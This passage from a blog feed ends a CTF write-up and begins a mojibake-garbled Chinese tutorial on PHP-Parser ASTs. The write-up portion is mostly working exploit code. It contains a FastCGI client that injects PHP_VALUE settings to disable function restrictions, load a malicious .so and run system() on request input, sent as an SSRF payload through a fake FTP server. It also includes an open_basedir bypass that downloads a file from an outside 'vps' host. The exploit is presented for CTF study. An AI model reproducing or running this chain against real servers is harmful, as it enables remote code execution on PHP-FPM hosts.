class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;?file=ftp://ip:9999&amp;data=&#x27;</span>.urlencode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">copy(<span class="string">&quot;http://vps/fastcgi.php&quot;</span>,<span class="string">&quot;/tmp/fastcgi.php&quot;</span>);</span><br><span class="line"><span class="comment">// copy(&quot;http://vps/hpdoger.so&quot;,&quot;/tmp/hpdoger.so&quot;);</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºPHP-ASTè¿™ä»¶äº‹</title>
      <link href="2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
      <url>2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h1><p>ğŸ‘´æƒ³å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–å¯»æ‰¾ php ååºåˆ—åŒ–é“¾çš„å°ç©æ„ã€‚</p><p>æœ€å¼€å§‹å†™é¡¹ç›®çš„é©±åŠ¨æ˜¯é»„æ€»è¯´è¦å‡†å¤‡å›½èµ›çš„é¡¹ç›®èµ›ï¼Œç„¶åè¡¨ç¤ºâ€œä»Šå¹´ä¸èƒ½åƒå»å¹´ä¸€æ ·é¸½æ‰äº†â€ï¼Œå†ç„¶ååœ¨ä¸€æ¬¡å¼€ä¼šä¸Šï¼ŒåŒæ–¹ä¹Ÿæ˜¯ç›¸è§†ä¸€ç¬‘ï¼šâ€œå˜¿å˜¿ï¼Œå˜¿å˜¿â€ï¼Œä¹Ÿå°±è¿™ä¹ˆæç½®ä¸‹æ¥äº†ã€‚ç„¶åè¯´è¦æˆ‘ä»¬å‡†å¤‡å¥½å¸¦å¥½ä¸‹ä¸€å±Šï¼Œè®©ä»–ä»¬æï¼Œç„¶åçœ‹äº†çœ‹è¿™ç¾¤å…”å´½å­ï¼Œå½³äºâ€¦â€¦è¿˜è¿œç€ã€‚ç„¶åç°åœ¨æ˜¯ç¡®å®è‡ªå·±æœ‰äº†æƒ³æçš„åŠ¨åŠ›ï¼ˆåŸå› ä¸æ˜ï¼‰ï¼Œçªç„¶ï¼Œæ¬¸å°±å¾ˆæƒ³æäº†ï¼Œæ‰€ä»¥å°±å†æ¡èµ·æ¥ã€‚</p><p>ä½†æ˜¯å¯¹äºå¤§æ¦‚çš„é¡¹ç›®æµç¨‹è¿˜æ˜¯è›®ä¸ç†è§£ï¼Œåˆæ˜¯è‡ªå·±ä¸€ä¸ªäººæï¼Œå°±å…ˆæ‘¸ç´¢ç ”ç©¶ä¸€ä¸‹ã€‚åœ¨ç½‘ä¸Šæ‰¾äº†å¾ˆä¹…æ‰¾åˆ°äº† <code>PHP-Parser</code> è¿™ä¸ªå·¥å…·ï¼Œæ˜¯ä¸“é—¨åš PHP AST çš„ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹å§</p><hr><p>PHP-Parser çš„é¡¹ç›®ä¸»é¡µæ˜¯ <a href="https://github.com/nikic/PHP-Parser%E3%80%82%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%A4%9A%E7%89%88%E6%9C%AC%E7%9A%84">https://github.com/nikic/PHP-Parserã€‚å¯ä»¥å¯¹å¤šç‰ˆæœ¬çš„</a> PHP è¿›è¡Œå®Œç¾è§£æï¼Œç”Ÿæˆä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘</p><p>å¯¹äºè¯æ³•åˆ†æï¼ŒPHP æœ‰ä¸ªå†…ç½®å‡½æ•° <code>token_get_all()</code> å¯ä»¥ç”¨æ¥è·å– TOKENSï¼Œä½œä¸ºè¯­æ³•åˆ†æçš„è¾“å…¥ï¼Œè¿™ä¸ªå¼€æºé¡¹ç›®ä¹Ÿæ˜¯ç”¨çš„ <code>token_get_all()</code> ç”Ÿæˆçš„ token æµ</p><blockquote><p>ä¸è¿‡è¯è¯´å›æ¥ï¼ŒASTï¼Œå³ Abstract Syntax Treeï¼Œä¹Ÿå°±æ˜¯æŠ½è±¡è¯­æ³•æ ‘ï¼Œå®ƒæ˜¯æºä»£ç è¯­æ³•ç»“æ„çš„ä¸€ç§æŠ½è±¡è¡¨ç¤ºï¼Œå¯ä»¥å°†ä½ æ‰€å†™çš„çš„ä»£ç ç”¨æ ‘çŠ¶ç»“æ„åŒ–è¡¨ç°å‡ºæ¥</p></blockquote><hr><p>é‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€æ•´å§</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å¯ä»¥ä½¿ç”¨ PHP çš„åŒ…ç®¡ç†å·¥å…· composer æ·»åŠ ï¼Œåœ¨é¡¹ç›®ç›®å½•æ‰§è¡Œå‘½ä»¤ <code>php composer.phar require nikic/php-parser</code> å³å¯ï¼Œå¦‚æœæ²¡æœ‰ä¸‹è½½ composerï¼Œå°±å…ˆæ‰§è¡Œ <code>curl -s http://getcomposer.org/installer | php</code> æ¥å®‰è£…ã€‚</p><h2 id="å¼€æ"><a href="#å¼€æ" class="headerlink" title="å¼€æ"></a>å¼€æ</h2><p>è·Ÿç€<a href="https://github.com/nikic/PHP-Parser/tree/master/doc">å®˜æ–¹æ–‡æ¡£</a> å­¦äº†ã€‚</p><h3 id="åŸºæœ¬ç»„æˆè¯­æ³•"><a href="#åŸºæœ¬ç»„æˆè¯­æ³•" class="headerlink" title="åŸºæœ¬ç»„æˆè¯­æ³•"></a>åŸºæœ¬ç»„æˆè¯­æ³•</h3><h4 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h4><p>å¦‚æœè¦ä½¿ç”¨è¿™ä¸ªåº“çš„è¯ï¼Œé¦–å…ˆè¦å°† composer ç”Ÿæˆçš„è‡ªåŠ¨è£…å¸¦å™¨ç»™åŒ…å«è¿›æ¥ï¼Œå¯ä»¥ä½¿ç”¨ <code>require &#39;path/to/vendor/autoload.php&#39;;</code>ã€‚</p><p>å¦å¤–ï¼Œä½ å¯ä»¥æŠŠ <code>xdebug.max_nesting_level</code> è®¾ç½®ä¸ºæ›´é«˜çš„å€¼ï¼š<code>ini_set(&#39;xdebug.max_nesting_level&#39;, 3000);</code>ã€‚</p><p>è¿™æ ·å¯ä»¥ç¡®ä¿éå†é«˜åº¦åµŒå¥—çš„èŠ‚ç‚¹æ ‘æ—¶ä¸ä¼šå‡ºç°é”™è¯¯ï¼Œä½†æ˜¯æœ€å¥½å®Œå…¨ç¦ç”¨ Xdebugï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“ä½¿è¯¥åº“çš„è¿è¡Œé€Ÿåº¦æ…¢äº”å€ä»¥ä¸Šã€‚</p><h4 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h4><p>æˆ‘ä»¬å¯ä»¥åˆ›é€ ä¸€ä¸ª parserï¼ˆè§£æå™¨ï¼‰å®ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå·¥å‚ç±»æ¥å—ä¸€ä¸ªå‚æ•°ä»¥åŒºåˆ«å¯¹å¾…ä¸åŒç‰ˆæœ¬çš„ PHPï¼š</p><table><thead><tr><th>Kind</th><th>Behavior</th></tr></thead><tbody><tr><td>ParserFactory::PREFER_PHP7</td><td>å°è¯•å°†ä»£ç è§£æä¸ºPHP7ã€‚å¦‚æœå¤±è´¥ï¼Œè¯·å°è¯•å°†å…¶è§£æä¸ºPHP 5</td></tr><tr><td>ParserFactory::PREFER_PHP5</td><td>å°è¯•å°†ä»£ç è§£æä¸ºPHP5ã€‚å¦‚æœå¤±è´¥ï¼Œè¯·å°è¯•å°†å…¶è§£æä¸ºPHP 7</td></tr><tr><td>ParserFactory::ONLY_PHP7</td><td>å°†ä»£ç è§£æä¸ºPHP7</td></tr><tr><td>ParserFactory::ONLY_PHP5</td><td>å°†ä»£ç è§£æä¸ºPHP5</td></tr></tbody></table><p>é™¤éæœ‰æ›´å¥½çš„é€‰æ‹©ï¼Œä¸€èˆ¬é»˜è®¤ç”¨ <code>PREFER_PHP7</code>ï¼Œ<code>create()</code> æ–¹æ³•å¯ä»¥é€‰æ‹©æ€§åœ°æ¥å— <code>Lexer</code> ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™ä¸ªæˆ‘ä»¬å§‘ä¸”ä¸åšç ”ç©¶ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæˆ‘ä»¬éœ€è¦ AST åŒ–çš„ PHP ä»£ç ä¼ é€’ç»™ parse æ–¹æ³•ï¼Œå¦‚æœé‡åˆ°äº†è¯­æ³•é”™è¯¯ï¼Œå°†ä¼šæŠ›å‡º <code>PhpParser\Error</code> å¼‚å¸¸ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = &lt;&lt;&lt;<span class="string">&#x27;CODE&#x27;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printLine</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">printLine(<span class="string">&#x27;Hello World!!!&#x27;</span>);</span><br><span class="line">CODE;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmts</span> = <span class="variable">$parser</span>-&gt;parse(<span class="variable">$code</span>);</span><br><span class="line">    <span class="comment">// $stmts is an array of statement nodes</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Parse Error: &#x27;</span>, <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª parser å®ä¾‹å¯ä»¥é‡å¤ä½¿ç”¨ä»¥è§£æå¤šä¸ªæ–‡ä»¶ã€‚</p><h4 id="èŠ‚ç‚¹è½¬å‚¨"><a href="#èŠ‚ç‚¹è½¬å‚¨" class="headerlink" title="èŠ‚ç‚¹è½¬å‚¨"></a>èŠ‚ç‚¹è½¬å‚¨</h4><p>å¦‚æœè¦ä»¥äººå¯è¯»çš„æ–¹å¼å»è½¬å‚¨ AST çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>NodeDumper</code>ï¼›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nodeDumper</span> = <span class="keyword">new</span> NodeDumper;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nodeDumper</span>-&gt;dump(<span class="variable">$stmts</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯¹äºä¹‹å‰çš„å®ä¾‹ï¼Œå°†ä¼šè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    0: Stmt_Function(</span><br><span class="line">        attrGroups: array(</span><br><span class="line">        )</span><br><span class="line">        byRef: false</span><br><span class="line">        name: Identifier(</span><br><span class="line">            name: printLine</span><br><span class="line">        )</span><br><span class="line">        params: array(</span><br><span class="line">            0: Param(</span><br><span class="line">                attrGroups: array(</span><br><span class="line">                )</span><br><span class="line">                flags: 0</span><br><span class="line">                type: null</span><br><span class="line">                byRef: false</span><br><span class="line">                variadic: false</span><br><span class="line">                var: Expr_Variable(</span><br><span class="line">                    name: msg</span><br><span class="line">                )</span><br><span class="line">                default: null</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">        returnType: null</span><br><span class="line">        stmts: array(</span><br><span class="line">            0: Stmt_Echo(</span><br><span class="line">                exprs: array(</span><br><span class="line">                    0: Expr_Variable(</span><br><span class="line">                        name: msg</span><br><span class="line">                    )</span><br><span class="line">                    1: Scalar_String(</span><br><span class="line">                        value: </span><br><span class="line">                    </span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    1: Stmt_Expression(</span><br><span class="line">        expr: Expr_FuncCall(</span><br><span class="line">            name: Name(</span><br><span class="line">                parts: array(</span><br><span class="line">                    0: printLine</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            args: array(</span><br><span class="line">                0: Arg(</span><br><span class="line">                    name: null</span><br><span class="line">                    value: Scalar_String(</span><br><span class="line">                        value: Hello World!!!</span><br><span class="line">                    )</span><br><span class="line">                    byRef: false</span><br><span class="line">                    unpack: false</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>php-parse</code> è„šæœ¬ï¼Œä½¿ç”¨æ–‡ä»¶åæˆ–è€…ä»£ç å­—ç¬¦ä¸²è°ƒç”¨å®ƒæ¥è·å– ASTï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vendor/bin/php-parse test.php</span><br><span class="line">vendor/bin/php-parse &quot;&lt;?php foo();&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/8YoSePjMbZUhdXm.png"></p><p>å¦‚æœæƒ³è¦å¿«é€Ÿè·å– AST ä¸­æŸäº›è¯­æ³•çš„è¡¨è¾¾æ–¹å¼çš„è¯ï¼Œè¿™æ ·å°±å¾ˆå¯ã€‚</p><h4 id="èŠ‚ç‚¹ğŸŒ³ç»“æ„"><a href="#èŠ‚ç‚¹ğŸŒ³ç»“æ„" class="headerlink" title="èŠ‚ç‚¹ğŸŒ³ç»“æ„"></a>èŠ‚ç‚¹ğŸŒ³ç»“æ„</h4><p>è§‚å¯Ÿä¸Šé¢çš„èŠ‚ç‚¹è½¬å‚¨ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸Šé¢ä»£ç ä¸­çš„ <code>$stms</code> æ˜¯ä¸¤ä¸ªèŠ‚ç‚¹çš„æ•°ç»„ï¼Œä¸€ä¸ª <code>Stmt_Function</code> å’Œä¸€ä¸ª <code>Stmt_Expression</code> èŠ‚ç‚¹ï¼Œå®ƒä»¬æ‰€å¯¹åº”çš„ç±»åç§°ä¸ºï¼š</p><ul><li><code>Stmt_Function</code> -&gt; <code>PhpParser\Node\Stmt\Function_</code></li><li><code>Stmt_Expression</code> -&gt; <code>PhpParser\Node\Stmt\Expression</code></li></ul><p>å¯èƒ½æœ‰äººæ³¨æ„åˆ°äº† Function ç±»çš„æœ€åé¢å¤šäº†ä¸€ä¸ª <code>_</code>ï¼Œä½†æ˜¯ Function 